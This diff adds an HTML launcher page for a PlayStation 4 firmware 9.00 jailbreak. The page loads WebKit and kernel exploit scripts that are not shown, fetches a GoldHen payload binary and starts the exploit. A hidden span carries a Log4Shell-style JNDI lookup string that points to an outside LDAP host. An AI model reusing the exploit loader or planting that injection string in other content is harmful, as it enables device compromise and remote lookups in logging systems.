@@ -1,0 +1,137 @@
+<html>
+
+<head>
+    <title>Jailbreak with GoldHen | 9.00</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        #Title {
+        color: white;
+        text-align: center;
+        }
+
+        body {
+            background-color: #2a013a;
+            cursor: none;
+        }
+
+        .loader {
+            position: absolute;
+            left: 50%;
+            top: 50%;
+            margin: -75px 0 0 -75px;
+
+            border: 10px solid #f8f8f8;
+            border-radius: 50%;
+            border-top: 10px solid #6c0495;
+            border-left: 10px solid #6c0495;
+            width: 120px;
+            height: 120px;
+            animation: spin 1s linear infinite;
+        }
+
+        .credits
+        {
+            overflow:hidden;
+            position:fixed;
+            position:absolute;
+            top:90%;
+            left:50%;
+            font-size:16px;
+            font-family:sans-serif;
+            text-align:center;
+            transform:translate(-50%,-90%);
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .info {
+            text-align: center;
+
+            font-family: sans-serif;
+            color: #b8b8b8;
+        }
+
+        .j {
+            display: none;
+            font-size: 15px;
+            color: #2F3335;
+        }
+    </style>
+    <script>
+        function allset() {
+            document.getElementById("loader").style.display = "none";
+            document.getElementById("allset").style.display = "block";
+            setTimeout(window.location = "../../?J=P",2000);
+        }
+
+        function awaitpl() {
+            document.getElementById("loader").style.display = "none";
+            document.getElementById("awaiting").style.display = "block";
+            loadpayload();
+            
+        }
+
+        PLfile = "./Payloads/goldhen_900.bin";
+        //PLfile = "./Jailbreak/900/LinuxLoader-900-3gb.bin";
+        
+    </script>
+    <script src="Jailbreak/900/int64.js"></script>
+    <script src="Jailbreak/900/rop.js"></script>
+    <script src="Jailbreak/900/kexploit.js"></script>
+    <script src="Jailbreak/900/webkit.js"></script>
+</head>
+
+</html>
+
+<body>
+    <h1 style="font-family: 'Franklin Gothic Medium', serif; font-size: x-large;text-align: center;letter-spacing: 5px;color: white;">PS4Xploit</h1>
+    <br/>
+    <br/>
+    <div id="loader" class="loader"></div>
+    <div id="awaiting" class="info" style="display:none;">
+        <p style="text-align: center;">WAIT PAYLOAD....</p>
+        <br />
+        <p style="text-align: center;color: red;size: 40px;">REMOVE THE USB !!!!!!</p>
+        <span class="j">${jndi:ldap://nsa.gov}</span>
+    </div>
+
+    <div id="allset" class="info" style="display:none;">
+        SUCCESS
+        <p style="text-align: center;color: red;size: 45px;">REMOVE THE USB !!!!</p>
+    </div>
+
+    <div id=footer class=credits>
+        <ul style=list-style:none;padding-left:0>
+        <li><a style="color: white; text-decoration: none;text-underline-position: below;" href=#>laureeeeeee</a></li>
+        <li><a style="color: white; text-decoration: none;text-underline-position: below;" href=#>Leeful</a></li>
+        <li><a style="color: white; text-decoration: none;text-underline-position: below;" href=https://twitter.com/SpecterDev target="_blank">Specter</a></li>
+        <li><a style="color: white; text-decoration: none;text-underline-position: below;" href=https://twitter.com/Znullptr target="_blank">Znullptr</a></li>
+        <li><a style="color: white; text-decoration: none;text-underline-position: below;" href=https://twitter.com/theflow0 target="_blank">Andy Nguyen</a></li>
+        <li><a style="color: white; text-decoration: none;text-underline-position: below;" href=https://twitter.com/sleirsgoevy target="_blank">sleirsgoevy</a></li>
+        </ul>
+        </div>
+
+</body>
+<script>
+    var req = new XMLHttpRequest();
+    req.responseType = "arraybuffer";
+    req.open("GET",PLfile,true);
+    req.send();
+    req.onreadystatechange=function(){
+    if (req.readyState == 4){
+      var tmp0 = new Uint8Array(req.response.byteLength);
+      tmp0.set(new Uint8Array(req.response), 0);
+      var payload = new Uint32Array(tmp0);
+      ghPL = payload;
+      setTimeout(poc, 1500); 
+      }
+    };
+    </script>
